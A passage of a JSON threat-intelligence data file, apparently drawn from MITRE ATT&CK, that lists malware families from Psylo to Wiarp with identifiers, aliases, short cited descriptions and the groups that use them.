    "id": "S0078",
    "name": "Psylo",
    "examples": [],
    "similar_words": [
      "Psylo"
    ],
    "description": "[Psylo](https://attack.mitre.org/software/S0078) is a shellcode-based Trojan that has been used by [Scarlet Mimic](https://attack.mitre.org/groups/G0029). It has similar characteristics as [FakeM](https://attack.mitre.org/software/S0076). (Citation: Scarlet Mimic Jan 2016)",
    "example_uses": []
  },
  "malware--5f9f7648-04ba-4a9f-bb4c-2a13e74572bd": {
    "id": "S0147",
    "name": "Pteranodon",
    "examples": [],
    "similar_words": [
      "Pteranodon"
    ],
    "description": "[Pteranodon](https://attack.mitre.org/software/S0147) is a custom backdoor used by [Gamaredon Group](https://attack.mitre.org/groups/G0047). (Citation: Palo Alto Gamaredon Feb 2017)",
    "example_uses": []
  },
  "malware--7e6c2a9d-9dc1-4eb0-b27c-91e8076a9d77": {
    "id": "S0269",
    "name": "QUADAGENT",
    "examples": [],
    "similar_words": [
      "QUADAGENT"
    ],
    "description": "[QUADAGENT](https://attack.mitre.org/software/S0269) is a PowerShell backdoor used by [OilRig](https://attack.mitre.org/groups/G0049). (Citation: Unit 42 QUADAGENT July 2018)",
    "example_uses": []
  },
  "malware--8c553311-0baa-4146-997a-f79acef3d831": {
    "id": "S0055",
    "name": "RARSTONE",
    "examples": [],
    "similar_words": [
      "RARSTONE"
    ],
    "description": "[RARSTONE](https://attack.mitre.org/software/S0055) is malware used by the [Naikon](https://attack.mitre.org/groups/G0019) group that has some characteristics similar to [PlugX](https://attack.mitre.org/software/S0013). (Citation: Aquino RARSTONE)",
    "example_uses": []
  },
  "malware--9b325b06-35a1-457d-be46-a4ecc0b7ff0c": {
    "id": "S0241",
    "name": "RATANKBA",
    "examples": [],
    "similar_words": [
      "RATANKBA"
    ],
    "description": "[RATANKBA](https://attack.mitre.org/software/S0241) is a remote controller tool used by [Lazarus Group](https://attack.mitre.org/groups/G0032). [RATANKBA](https://attack.mitre.org/software/S0241) has been used in attacks targeting financial institutions in Poland, Mexico, Uruguay, the United Kingdom, and Chile. It was also seen used against organizations related to telecommunications, management consulting, information technology, insurance, aviation, and education. [RATANKBA](https://attack.mitre.org/software/S0241) has a graphical user interface to allow the attacker to issue jobs to perform on the infected machines. (Citation: Lazarus RATANKBA) (Citation: RATANKBA)",
    "example_uses": []
  },
  "malware--b9eec47e-98f4-4b3c-b574-3fa8a87ebe05": {
    "id": "S0258",
    "name": "RGDoor",
    "examples": [],
    "similar_words": [
      "RGDoor"
    ],
    "description": "[RGDoor](https://attack.mitre.org/software/S0258) is a malicious Internet Information Services (IIS) backdoor developed in the C++ language. [RGDoor](https://attack.mitre.org/software/S0258) has been seen deployed on webservers belonging to the Middle East government organizations. [RGDoor](https://attack.mitre.org/software/S0258) provides backdoor access to compromised IIS servers. (Citation: Unit 42 RGDoor Jan 2018)",
    "example_uses": []
  },
  "malware--ad4f146f-e3ec-444a-ba71-24bffd7f0f8e": {
    "id": "S0003",
    "name": "RIPTIDE",
    "examples": [],
    "similar_words": [
      "RIPTIDE"
    ],
    "description": "[RIPTIDE](https://attack.mitre.org/software/S0003) is a proxy-aware backdoor used by [APT12](https://attack.mitre.org/groups/G0005). (Citation: Moran 2014)",
    "example_uses": []
  },
  "malware--cba78a1c-186f-4112-9e6a-be1839f030f7": {
    "id": "S0112",
    "name": "ROCKBOOT",
    "examples": [],
    "similar_words": [
      "ROCKBOOT"
    ],
    "description": "[ROCKBOOT](https://attack.mitre.org/software/S0112) is a [Bootkit](https://attack.mitre.org/techniques/T1542/003) that has been used by an unidentified, suspected China-based group. (Citation: FireEye Bootkits)",
    "example_uses": []
  },
  "malware--60a9c2f0-b7a5-4e8e-959c-e1a3ff314a5f": {
    "id": "S0240",
    "name": "ROKRAT",
    "examples": [],
    "similar_words": [
      "ROKRAT"
    ],
    "description": "[ROKRAT](https://attack.mitre.org/software/S0240) is a cloud-based remote access tool (RAT) used by [APT37](https://attack.mitre.org/groups/G0067) to target victims in South Korea. [APT37](https://attack.mitre.org/groups/G0067) has used ROKRAT during several campaigns from 2016 through 2021.(Citation: Talos ROKRAT)(Citation: Talos Group123)(Citation: Volexity InkySquid RokRAT August 2021)",
    "example_uses": []
  },
  "malware--92ec0cbd-2c30-44a2-b270-73f4ec949841": {
    "id": "S0148",
    "name": "RTM",
    "examples": [],
    "similar_words": [
      "RTM"
    ],
    "description": "[RTM](https://attack.mitre.org/software/S0148) is custom malware written in Delphi. It is used by the group of the same name ([RTM](https://attack.mitre.org/groups/G0048)). Newer versions of the malware have been reported publicly as Redaman.(Citation: ESET RTM Feb 2017)(Citation: Unit42 Redaman January 2019)",
    "example_uses": []
  },
  "malware--9752aef4-a1f3-4328-929f-b64eb0536090": {
    "id": "S0169",
    "name": "RawPOS",
    "examples": [],
    "similar_words": [
      "RawPOS",
      "FIENDCRY",
      "DUEBREW",
      "DRIFTWOOD"
    ],
    "description": "[RawPOS](https://attack.mitre.org/software/S0169) is a point-of-sale (POS) malware family that searches for cardholder data on victims. It has been in use since at least 2008. (Citation: Kroll RawPOS Jan 2017) (Citation: TrendMicro RawPOS April 2015) (Citation: Visa RawPOS March 2015) FireEye divides RawPOS into three components: FIENDCRY, DUEBREW, and DRIFTWOOD. (Citation: Mandiant FIN5 GrrCON Oct 2016) (Citation: DarkReading FireEye FIN5 Oct 2015)",
    "example_uses": []
  },
  "malware--65341f30-bec6-4b1d-8abf-1a5620446c29": {
    "id": "S0172",
    "name": "Reaver",
    "examples": [],
    "similar_words": [
      "Reaver"
    ],
    "description": "[Reaver](https://attack.mitre.org/software/S0172) is a malware family that has been in the wild since at least late 2016. Reporting indicates victims have primarily been associated with the \"Five Poisons,\" which are movements the Chinese government considers dangerous. The type of malware is rare due to its final payload being in the form of [Control Panel](https://attack.mitre.org/techniques/T1218/002) items.(Citation: Palo Alto Reaver Nov 2017)",
    "example_uses": []
  },
  "malware--17b40f60-729f-4fe8-8aea-cc9ee44a95d5": {
    "id": "S0153",
    "name": "RedLeaves",
    "examples": [],
    "similar_words": [
      "RedLeaves",
      "BUGJUICE"
    ],
    "description": "[RedLeaves](https://attack.mitre.org/software/S0153) is a malware family used by [menuPass](https://attack.mitre.org/groups/G0045). The code overlaps with [PlugX](https://attack.mitre.org/software/S0013) and may be based upon the open source tool Trochilus. (Citation: PWC Cloud Hopper Technical Annex April 2017) (Citation: FireEye APT10 April 2017)",
    "example_uses": []
  },
  "malware--4c59cce8-cb48-4141-b9f1-f646edfaadb0": {
    "id": "S0019",
    "name": "Regin",
    "examples": [],
    "similar_words": [
      "Regin"
    ],
    "description": "[Regin](https://attack.mitre.org/software/S0019) is a malware platform that has targeted victims in a range of industries, including telecom, government, and financial institutions. Some [Regin](https://attack.mitre.org/software/S0019) timestamps date back to 2003. (Citation: Kaspersky Regin)",
    "example_uses": []
  },
  "malware--4e6b9625-bbda-4d96-a652-b3bb45453f26": {
    "id": "S0166",
    "name": "RemoteCMD",
    "examples": [],
    "similar_words": [
      "RemoteCMD"
    ],
    "description": "[RemoteCMD](https://attack.mitre.org/software/S0166) is a custom tool used by [APT3](https://attack.mitre.org/groups/G0022) to execute commands on a remote system similar to SysInternal's PSEXEC functionality. (Citation: Symantec Buckeye)",
    "example_uses": []
  },
  "malware--69d6f4a9-fcf0-4f51-bca7-597c51ad0bb8": {
    "id": "S0125",
    "name": "Remsec",
    "examples": [],
    "similar_words": [
      "Remsec",
      "Backdoor.Remsec",
      "ProjectSauron"
    ],
    "description": "[Remsec](https://attack.mitre.org/software/S0125) is a modular backdoor that has been used by [Strider](https://attack.mitre.org/groups/G0041) and appears to have been designed primarily for espionage purposes. Many of its modules are written in Lua. (Citation: Symantec Strider Blog)",
    "example_uses": []
  },
  "malware--8ec6e3b4-b06d-4805-b6aa-af916acc2122": {
    "id": "S0270",
    "name": "RogueRobin",
    "examples": [],
    "similar_words": [
      "RogueRobin"
    ],
    "description": "[RogueRobin](https://attack.mitre.org/software/S0270) is a payload used by [DarkHydrus](https://attack.mitre.org/groups/G0079) that has been developed in PowerShell and C#. (Citation: Unit 42 DarkHydrus July 2018)(Citation: Unit42 DarkHydrus Jan 2019)",
    "example_uses": []
  },
  "malware--6b616fc1-1505-48e3-8b2c-0d19337bff38": {
    "id": "S0090",
    "name": "Rover",
    "examples": [],
    "similar_words": [
      "Rover"
    ],
    "description": "[Rover](https://attack.mitre.org/software/S0090) is malware suspected of being used for espionage purposes. It was used in 2015 in a targeted email sent to an Indian Ambassador to Afghanistan. (Citation: Palo Alto Rover)",
    "example_uses": []
  },
  "malware--60d50676-459a-47dd-92e9-a827a9fe9c58": {
    "id": "S0253",
    "name": "RunningRAT",
    "examples": [],
    "similar_words": [
      "RunningRAT"
    ],
    "description": "[RunningRAT](https://attack.mitre.org/software/S0253) is a remote access tool that appeared in operations surrounding the 2018 Pyeongchang Winter Olympics along with [Gold Dragon](https://attack.mitre.org/software/S0249) and [Brave Prince](https://attack.mitre.org/software/S0252). (Citation: McAfee Gold Dragon)",
    "example_uses": []
  },
  "malware--66b1dcde-17a0-4c7b-95fa-b08d430c2131": {
    "id": "S0085",
    "name": "S-Type",
    "examples": [],
    "similar_words": [
      "S-Type"
    ],
    "description": "[S-Type](https://attack.mitre.org/software/S0085) is a backdoor that was used in [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016) since at least 2013.(Citation: Cylance Dust Storm)",
    "example_uses": []
  },
  "malware--0998045d-f96e-4284-95ce-3c8219707486": {
    "id": "S0185",
    "name": "SEASHARPEE",
    "examples": [],
    "similar_words": [
      "SEASHARPEE"
    ],
    "description": "[SEASHARPEE](https://attack.mitre.org/software/S0185) is a Web shell that has been used by [OilRig](https://attack.mitre.org/groups/G0049). (Citation: FireEye APT34 Webinar Dec 2017)",
    "example_uses": []
  },
  "malware--b1de6916-7a22-4460-8d26-6b5483ffaa2a": {
    "id": "S0028",
    "name": "SHIPSHAPE",
    "examples": [],
    "similar_words": [
      "SHIPSHAPE"
    ],
    "description": "[SHIPSHAPE](https://attack.mitre.org/software/S0028) is malware developed by [APT30](https://attack.mitre.org/groups/G0013) that allows propagation and exfiltration of data over removable devices. [APT30](https://attack.mitre.org/groups/G0013) may use this capability to exfiltrate data across air-gaps. (Citation: FireEye APT30)",
    "example_uses": []
  },
  "malware--58adaaa8-f1e8-4606-9a08-422e568461eb": {
    "id": "S0063",
    "name": "SHOTPUT",
    "examples": [],
    "similar_words": [
      "SHOTPUT",
      "Backdoor.APT.CookieCutter",
      "Pirpi"
    ],
    "description": "[SHOTPUT](https://attack.mitre.org/software/S0063) is a custom backdoor used by [APT3](https://attack.mitre.org/groups/G0022). (Citation: FireEye Clandestine Wolf)",
    "example_uses": []
  },
  "malware--4189a679-72ed-4a89-a57c-7f689712ecf8": {
    "id": "S0217",
    "name": "SHUTTERSPEED",
    "examples": [],
    "similar_words": [
      "SHUTTERSPEED"
    ],
    "description": "[SHUTTERSPEED](https://attack.mitre.org/software/S0217) is a backdoor used by [APT37](https://attack.mitre.org/groups/G0067). (Citation: FireEye APT37 Feb 2018)",
    "example_uses": []
  },
  "malware--414dc555-c79e-4b24-a2da-9b607f7eaf16": {
    "id": "S0218",
    "name": "SLOWDRIFT",
    "examples": [],
    "similar_words": [
      "SLOWDRIFT"
    ],
    "description": "[SLOWDRIFT](https://attack.mitre.org/software/S0218) is a backdoor used by [APT37](https://attack.mitre.org/groups/G0067) against academic and strategic victims in South Korea. (Citation: FireEye APT37 Feb 2018)",
    "example_uses": []
  },
  "malware--3240cbe4-c550-443b-aa76-cc2a7058b870": {
    "id": "S0159",
    "name": "SNUGRIDE",
    "examples": [],
    "similar_words": [
      "SNUGRIDE"
    ],
    "description": "[SNUGRIDE](https://attack.mitre.org/software/S0159) is a backdoor that has been used by [menuPass](https://attack.mitre.org/groups/G0045) as first stage malware. (Citation: FireEye APT10 April 2017)",
    "example_uses": []
  },
  "malware--9ca488bd-9587-48ef-b923-1743523e63b2": {
    "id": "S0157",
    "name": "SOUNDBITE",
    "examples": [],
    "similar_words": [
      "SOUNDBITE"
    ],
    "description": "[SOUNDBITE](https://attack.mitre.org/software/S0157) is a signature backdoor used by [APT32](https://attack.mitre.org/groups/G0050). (Citation: FireEye APT32 May 2017)",
    "example_uses": []
  },
  "malware--8b880b41-5139-4807-baa9-309690218719": {
    "id": "S0035",
    "name": "SPACESHIP",
    "examples": [],
    "similar_words": [
      "SPACESHIP"
    ],
    "description": "[SPACESHIP](https://attack.mitre.org/software/S0035) is malware developed by [APT30](https://attack.mitre.org/groups/G0013) that allows propagation and exfiltration of data over removable devices. [APT30](https://attack.mitre.org/groups/G0013) may use this capability to exfiltrate data across air-gaps. (Citation: FireEye APT30)",
    "example_uses": []
  },
  "malware--96b08451-b27a-4ff6-893f-790e26393a8e": {
    "id": "S0074",
    "name": "Sakula",
    "examples": [],
    "similar_words": [
      "Sakula",
      "Sakurel",
      "VIPER"
    ],
    "description": "[Sakula](https://attack.mitre.org/software/S0074) is a remote access tool (RAT) that first surfaced in 2012 and was used in intrusions throughout 2015. (Citation: Dell Sakula)",
    "example_uses": []
  },
  "malware--67e6d66b-1b82-4699-b47a-e2efb6268d14": {
    "id": "S0053",
    "name": "SeaDuke",
    "examples": [],
    "similar_words": [
      "SeaDuke",
      "SeaDaddy",
      "SeaDesk"
    ],
    "description": "[SeaDuke](https://attack.mitre.org/software/S0053) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2014 to 2015. It was used primarily as a secondary backdoor for victims that were already compromised with [CozyCar](https://attack.mitre.org/software/S0046). (Citation: F-Secure The Dukes)",
    "example_uses": []
  },
  "malware--8901ac23-6b50-410c-b0dd-d8174a86f9b3": {
    "id": "S0140",
    "name": "Shamoon",
    "examples": [],
    "similar_words": [
      "Shamoon",
      "Disttrack"
    ],
    "description": "[Shamoon](https://attack.mitre.org/software/S0140) is wiper malware that was first used by an Iranian group known as the \"Cutting Sword of Justice\" in 2012. Other versions known as Shamoon 2 and Shamoon 3 were observed in 2016 and 2018. [Shamoon](https://attack.mitre.org/software/S0140) has also been seen leveraging [RawDisk](https://attack.mitre.org/software/S0364) and Filerase to carry out data wiping tasks. Analysis has linked [Shamoon](https://attack.mitre.org/software/S0140) with [Kwampirs](https://attack.mitre.org/software/S0236) based on multiple shared artifacts and coding patterns.(Citation: Cylera Kwampirs 2022) The term Shamoon is sometimes used to refer to the group using the malware as well as the malware itself.(Citation: Palo Alto Shamoon Nov 2016)(Citation: Unit 42 Shamoon3 2018)(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)",
    "example_uses": []
  },
  "malware--89f63ae4-f229-4a5c-95ad-6f22ed2b5c49": {
    "id": "S0007",
    "name": "Skeleton Key",
    "examples": [],
    "similar_words": [
      "Skeleton Key"
    ],
    "description": "[Skeleton Key](https://attack.mitre.org/software/S0007) is malware used to inject false credentials into domain controllers with the intent of creating a backdoor password. (Citation: Dell Skeleton) Functionality similar to [Skeleton Key](https://attack.mitre.org/software/S0007) is included as a module in [Mimikatz](https://attack.mitre.org/software/S0002).",
    "example_uses": []
  },
  "malware--0c824410-58ff-49b2-9cf2-1c96b182bdf0": {
    "id": "S0226",
    "name": "Smoke Loader",
    "examples": [],
    "similar_words": [
      "Smoke Loader",
      "Dofoil"
    ],
    "description": "[Smoke Loader](https://attack.mitre.org/software/S0226) is a malicious bot application that can be used to load other malware.\n[Smoke Loader](https://attack.mitre.org/software/S0226) has been seen in the wild since at least 2011 and has included a number of different payloads. It is notorious for its use of deception and self-protection. It also comes with several plug-ins. (Citation: Malwarebytes SmokeLoader 2016) (Citation: Microsoft Dofoil 2018)",
    "example_uses": []
  },
  "malware--e494ad79-37ee-4cd0-866b-299c521d8b94": {
    "id": "S0273",
    "name": "Socksbot",
    "examples": [],
    "similar_words": [
      "Socksbot"
    ],
    "description": "[Socksbot](https://attack.mitre.org/software/S0273) is a backdoor that  abuses Socket Secure (SOCKS) proxies. (Citation: TrendMicro Patchwork Dec 2017)",
    "example_uses": []
  },
  "malware--2fb26586-2b53-4b9a-ad4f-2b3bcb9a2421": {
    "id": "S0058",
    "name": "SslMM",
    "examples": [],
    "similar_words": [
      "SslMM"
    ],
    "description": "[SslMM](https://attack.mitre.org/software/S0058) is a full-featured backdoor used by [Naikon](https://attack.mitre.org/groups/G0019) that has multiple variants. (Citation: Baumgartner Naikon 2015)",
    "example_uses": []
  },
  "malware--96566860-9f11-4b6f-964d-1c924e4f24a4": {
    "id": "S0188",
    "name": "Starloader",
    "examples": [],
    "similar_words": [
      "Starloader"
    ],
    "description": "[Starloader](https://attack.mitre.org/software/S0188) is a loader component that has been observed loading [Felismus](https://attack.mitre.org/software/S0171) and associated tools. (Citation: Symantec Sowbug Nov 2017)",
    "example_uses": []
  },
  "malware--91000a8a-58cc-4aba-9ad0-993ad6302b86": {
    "id": "S0142",
    "name": "StreamEx",
    "examples": [],
    "similar_words": [
      "StreamEx"
    ],
    "description": "[StreamEx](https://attack.mitre.org/software/S0142) is a malware family that has been used by [Deep Panda](https://attack.mitre.org/groups/G0009) since at least 2015. In 2016, it was distributed via legitimate compromised Korean websites. (Citation: Cylance Shell Crew Feb 2017)",
    "example_uses": []
  },
  "malware--6a0ef5d4-fc7c-4dda-85d7-592e4dbdc5d9": {
    "id": "S0018",
    "name": "Sykipot",
    "examples": [],
    "similar_words": [
      "Sykipot"
    ],
    "description": "[Sykipot](https://attack.mitre.org/software/S0018) is malware that has been used in spearphishing campaigns since approximately 2007 against victims primarily in the US. One variant of [Sykipot](https://attack.mitre.org/software/S0018) hijacks smart cards on victims. (Citation: Alienvault Sykipot DOD Smart Cards) The group using this malware has also been referred to as Sykipot. (Citation: Blasco 2013)",
    "example_uses": []
  },
  "malware--04227b24-7817-4de1-9050-b7b1b57f5866": {
    "id": "S0242",
    "name": "SynAck",
    "examples": [],
    "similar_words": [
      "SynAck"
    ],
    "description": "[SynAck](https://attack.mitre.org/software/S0242) is variant of Trojan ransomware targeting mainly English-speaking users since at least fall 2017. (Citation: SecureList SynAck Doppelgänging May 2018) (Citation: Kaspersky Lab SynAck May 2018)",
    "example_uses": []
  },
  "malware--7f8730af-f683-423f-9ee1-5f6875a80481": {
    "id": "S0060",
    "name": "Sys10",
    "examples": [],
    "similar_words": [
      "Sys10"
    ],
    "description": "[Sys10](https://attack.mitre.org/software/S0060) is a backdoor that was used throughout 2013 by [Naikon](https://attack.mitre.org/groups/G0019). (Citation: Baumgartner Naikon 2015)",
    "example_uses": []
  },
  "malware--876f6a77-fbc5-4e13-ab1a-5611986730a3": {
    "id": "S0098",
    "name": "T9000",
    "examples": [],
    "similar_words": [
      "T9000"
    ],
    "description": "[T9000](https://attack.mitre.org/software/S0098) is a backdoor that is a newer variant of the T5000 malware family, also known as Plat1. Its primary function is to gather information about the victim. It has been used in multiple targeted attacks against U.S.-based organizations. (Citation: FireEye admin@338 March 2014) (Citation: Palo Alto T9000 Feb 2016)",
    "example_uses": []
  },
  "malware--0b32ec39-ba61-4864-9ebe-b4b0b73caf9a": {
    "id": "S0164",
    "name": "TDTESS",
    "examples": [],
    "similar_words": [
      "TDTESS"
    ],
    "description": "[TDTESS](https://attack.mitre.org/software/S0164) is a 64-bit .NET binary backdoor used by [CopyKittens](https://attack.mitre.org/groups/G0052). (Citation: ClearSky Wilted Tulip July 2017)",
    "example_uses": []
  },
  "malware--4f6aa78c-c3d4-4883-9840-96ca2f5d6d47": {
    "id": "S0146",
    "name": "TEXTMATE",
    "examples": [],
    "similar_words": [
      "TEXTMATE",
      "DNSMessenger"
    ],
    "description": "[TEXTMATE](https://attack.mitre.org/software/S0146) is a second-stage PowerShell backdoor that is memory-resident. It was observed being used along with [POWERSOURCE](https://attack.mitre.org/software/S0145) in February 2017. (Citation: FireEye FIN7 March 2017)",
    "example_uses": []
  },
  "malware--85b39628-204a-48d2-b377-ec368cbcb7ca": {
    "id": "S0131",
    "name": "TINYTYPHON",
    "examples": [],
    "similar_words": [
      "TINYTYPHON"
    ],
    "description": "[TINYTYPHON](https://attack.mitre.org/software/S0131) is a backdoor  that has been used by the actors responsible for the MONSOON campaign. The majority of its code was reportedly taken from the MyDoom worm. (Citation: Forcepoint Monsoon)",
    "example_uses": []
  },
  "malware--db1355a7-e5c9-4e2c-8da7-eccf2ae9bf5c": {
    "id": "S0199",
    "name": "TURNEDUP",
    "examples": [],
    "similar_words": [
      "TURNEDUP"
    ],
    "description": "[TURNEDUP](https://attack.mitre.org/software/S0199) is a non-public backdoor. It has been dropped by [APT33](https://attack.mitre.org/groups/G0064)'s [StoneDrill](https://attack.mitre.org/software/S0380) malware. (Citation: FireEye APT33 Sept 2017) (Citation: FireEye APT33 Webinar Sept 2017)",
    "example_uses": []
  },
  "malware--7ba0fc46-197d-466d-8b9f-f1c64d5d81e5": {
    "id": "S0263",
    "name": "TYPEFRAME",
    "examples": [],
    "similar_words": [
      "TYPEFRAME"
    ],
    "description": "[TYPEFRAME](https://attack.mitre.org/software/S0263) is a remote access tool that has been used by [Lazarus Group](https://attack.mitre.org/groups/G0032). (Citation: US-CERT TYPEFRAME June 2018)",
    "example_uses": []
  },
  "malware--b143dfa4-e944-43ff-8429-bfffc308c517": {
    "id": "S0011",
    "name": "Taidoor",
    "examples": [],
    "similar_words": [
      "Taidoor"
    ],
    "description": "[Taidoor](https://attack.mitre.org/software/S0011) is a remote access trojan (RAT) that has been used by Chinese government cyber actors to maintain access on victim networks.(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021) [Taidoor](https://attack.mitre.org/software/S0011) has primarily been used against Taiwanese government organizations since at least 2010.(Citation: TrendMicro Taidoor)",
    "example_uses": []
  },
  "malware--c0c45d38-fe57-4cd4-b2b2-9ecd0ddd4ca9": {
    "id": "S0004",
    "name": "TinyZBot",
    "examples": [],
    "similar_words": [
      "TinyZBot"
    ],
    "description": "[TinyZBot](https://attack.mitre.org/software/S0004) is a bot written in C# that was developed by [Cleaver](https://attack.mitre.org/groups/G0003). (Citation: Cylance Cleaver)",
    "example_uses": []
  },
  "malware--00806466-754d-44ea-ad6f-0caf59cb8556": {
    "id": "S0266",
    "name": "TrickBot",
    "examples": [],
    "similar_words": [
      "TrickBot",
      "Totbrick",
      "TSPY_TRICKLOAD"
    ],
    "description": "[TrickBot](https://attack.mitre.org/software/S0266) is a Trojan spyware program written in C++ that first emerged in September 2016 as a possible successor to [Dyre](https://attack.mitre.org/software/S0024). [TrickBot](https://attack.mitre.org/software/S0266) was developed and initially used by [Wizard Spider](https://attack.mitre.org/groups/G0102) for targeting banking sites in North America, Australia, and throughout Europe; it has since been used against all sectors worldwide as part of \"big game hunting\" ransomware campaigns.(Citation: S2 Grupo TrickBot June 2017)(Citation: Fidelis TrickBot Oct 2016)(Citation: IBM TrickBot Nov 2016)(Citation: CrowdStrike Wizard Spider October 2020)",
    "example_uses": []
  },
  "malware--82cb34ba-02b5-432b-b2d2-07f55cbf674d": {
    "id": "S0094",
    "name": "Trojan.Karagany",
    "examples": [],
    "similar_words": [
      "Trojan.Karagany"
    ],
    "description": "[Trojan.Karagany](https://attack.mitre.org/software/S0094) is a modular remote access tool used for recon and linked to [Dragonfly](https://attack.mitre.org/groups/G0035). The source code for [Trojan.Karagany](https://attack.mitre.org/software/S0094) originated from Dream Loader malware which was leaked in 2010 and sold on underground forums. (Citation: Symantec Dragonfly)(Citation: Secureworks Karagany July 2019)(Citation: Dragos DYMALLOY )",
    "example_uses": []
  },
  "malware--c5e9cb46-aced-466c-85ea-7db5572ad9ec": {
    "id": "S0001",
    "name": "Trojan.Mebromi",
    "examples": [],
    "similar_words": [
      "Trojan.Mebromi"
    ],
    "description": "[Trojan.Mebromi](https://attack.mitre.org/software/S0001) is BIOS-level malware that takes control of the victim before MBR. (Citation: Ge 2011)",
    "example_uses": []
  },
  "malware--691c60e2-273d-4d56-9ce6-b67e0f8719ad": {
    "id": "S0178",
    "name": "Truvasys",
    "examples": [],
    "similar_words": [
      "Truvasys"
    ],
    "description": "[Truvasys](https://attack.mitre.org/software/S0178) is first-stage malware that has been used by [PROMETHIUM](https://attack.mitre.org/groups/G0056). It is a collection of modules written in the Delphi programming language. (Citation: Microsoft Win Defender Truvasys Sep 2017) (Citation: Microsoft NEODYMIUM Dec 2016) (Citation: Microsoft SIR Vol 21)",
    "example_uses": []
  },
  "malware--fb4e3792-e915-4fdd-a9cd-92dfa2ace7aa": {
    "id": "S0275",
    "name": "UPPERCUT",
    "examples": [],
    "similar_words": [
      "UPPERCUT",
      "ANEL"
    ],
    "description": "[UPPERCUT](https://attack.mitre.org/software/S0275) is a backdoor that has been used by [menuPass](https://attack.mitre.org/groups/G0045). (Citation: FireEye APT10 Sept 2018)",
    "example_uses": []
  },
  "malware--af2ad3b7-ab6a-4807-91fd-51bcaff9acbb": {
    "id": "S0136",
    "name": "USBStealer",
    "examples": [],
    "similar_words": [
      "USBStealer",
      "USB Stealer",
      "Win32/USBStealer"
    ],
    "description": "[USBStealer](https://attack.mitre.org/software/S0136) is malware that has been used by [APT28](https://attack.mitre.org/groups/G0007) since at least 2005 to extract information from air-gapped networks. It does not have the capability to communicate over the Internet and has been used in conjunction with [ADVSTORESHELL](https://attack.mitre.org/software/S0045). (Citation: ESET Sednit USBStealer 2014) (Citation: Kaspersky Sofacy)",
    "example_uses": []
  },
  "malware--3d8e547d-9456-4f32-a895-dc86134e282f": {
    "id": "S0221",
    "name": "Umbreon",
    "examples": [],
    "similar_words": [
      "Umbreon"
    ],
    "description": "A Linux rootkit that provides backdoor access and hides from defenders.",
    "example_uses": []
  },
  "malware--ab3580c8-8435-4117-aace-3d9fbe46aa56": {
    "id": "S0130",
    "name": "Unknown Logger",
    "examples": [],
    "similar_words": [
      "Unknown Logger"
    ],
    "description": "[Unknown Logger](https://attack.mitre.org/software/S0130) is a publicly released, free backdoor. Version 1.5 of the backdoor has been used by the actors responsible for the MONSOON campaign. (Citation: Forcepoint Monsoon)",
    "example_uses": []
  },
  "malware--80a014ba-3fef-4768-990b-37d8bd10d7f4": {
    "id": "S0022",
    "name": "Uroburos",
    "examples": [],
    "similar_words": [
      "Uroburos"
    ],
    "description": "[Uroburos](https://attack.mitre.org/software/S0022) is a sophisticated cyber espionage tool written in C that has been used by units within Russia's Federal Security Service (FSB) associated with the [Turla](https://attack.mitre.org/groups/G0010) toolset to collect intelligence on sensitive targets worldwide. [Uroburos](https://attack.mitre.org/software/S0022) has several variants and has undergone nearly constant upgrade since its initial development in 2003 to keep it viable after public disclosures. [Uroburos](https://attack.mitre.org/software/S0022) is typically deployed to external-facing nodes on a targeted network and has the ability to leverage additional tools and TTPs to further exploit an internal network. [Uroburos](https://attack.mitre.org/software/S0022) has interoperable implants for Windows, Linux, and macOS, employs a high level of stealth in communications and architecture, and can easily incorporate new or replacement components.(Citation: Joint Cybersecurity Advisory AA23-129A Snake Malware May 2023)(Citation: Kaspersky Turla)",
    "example_uses": []
  },
  "malware--5189f018-fea2-45d7-b0ed-23f9ee0a46f3": {
    "id": "S0257",
    "name": "VERMIN",
    "examples": [],
    "similar_words": [
      "VERMIN"
    ],
    "description": "[VERMIN](https://attack.mitre.org/software/S0257) is a remote access tool written in the Microsoft .NET framework. It is mostly composed of original code, but also has some open source code. (Citation: Unit 42 VERMIN Jan 2018)",
    "example_uses": []
  },
  "malware--f4d8a2d6-c684-453a-8a14-cf4a94f755c5": {
    "id": "S0207",
    "name": "Vasport",
    "examples": [],
    "similar_words": [
      "Vasport"
    ],
    "description": "[Vasport](https://attack.mitre.org/software/S0207) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor on compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Vasport May 2012)",
    "example_uses": []
  },
  "malware--495b6cdb-7b5a-4fbc-8d33-e7ef68806d08": {
    "id": "S0180",
    "name": "Volgmer",
    "examples": [],
    "similar_words": [
      "Volgmer"
    ],
    "description": "[Volgmer](https://attack.mitre.org/software/S0180) is a backdoor Trojan designed to provide covert access to a compromised system. It has been used since at least 2013 to target the government, financial, automotive, and media industries. Its primary delivery mechanism is suspected to be spearphishing. (Citation: US-CERT Volgmer Nov 2017)",
    "example_uses": []
  },
  "malware--1d808f62-cf63-4063-9727-ff6132514c22": {
    "id": "S0109",
    "name": "WEBC2",
    "examples": [],
    "similar_words": [
      "WEBC2"
    ],
    "description": "[WEBC2](https://attack.mitre.org/software/S0109) is a family of backdoor malware used by [APT1](https://attack.mitre.org/groups/G0006) as early as July 2006. [WEBC2](https://attack.mitre.org/software/S0109) backdoors are designed to retrieve a webpage, with commands hidden in HTML comments or special tags, from a predetermined C2 server. (Citation: Mandiant APT1 Appendix)(Citation: Mandiant APT1)",
    "example_uses": []
  },
  "malware--98e8a977-3416-43aa-87fa-33e287e9c14c": {
    "id": "S0155",
    "name": "WINDSHIELD",
    "examples": [],
    "similar_words": [
      "WINDSHIELD"
    ],
    "description": "[WINDSHIELD](https://attack.mitre.org/software/S0155) is a signature backdoor used by [APT32](https://attack.mitre.org/groups/G0050). (Citation: FireEye APT32 May 2017)",
    "example_uses": []
  },
  "malware--49abab73-3c5c-476e-afd5-69b5c732d845": {
    "id": "S0219",
    "name": "WINERACK",
    "examples": [],
    "similar_words": [
      "WINERACK"
    ],
    "description": "[WINERACK](https://attack.mitre.org/software/S0219) is a backdoor used by [APT37](https://attack.mitre.org/groups/G0067). (Citation: FireEye APT37 Feb 2018)",
    "example_uses": []
  },
  "malware--039814a0-88de-46c5-a4fb-b293db21880a": {
    "id": "S0206",
    "name": "Wiarp",
    "examples": [],
    "similar_words": [
      "Wiarp"
    ],
